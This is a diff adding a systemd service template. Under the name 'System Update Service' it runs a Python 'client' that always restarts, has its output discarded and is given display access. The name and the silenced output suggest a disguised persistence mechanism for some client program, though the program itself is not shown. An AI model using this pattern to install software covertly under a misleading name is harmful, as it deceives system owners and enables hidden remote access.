@@ -1,0 +1,16 @@
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={{PYTHON_EXEC}} {{INSTALL_DIR}}/client/main.py
+WorkingDirectory={{INSTALL_DIR}}/client
+Restart=always
+RestartSec=30
+Environment=DISPLAY=:0
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=default.target
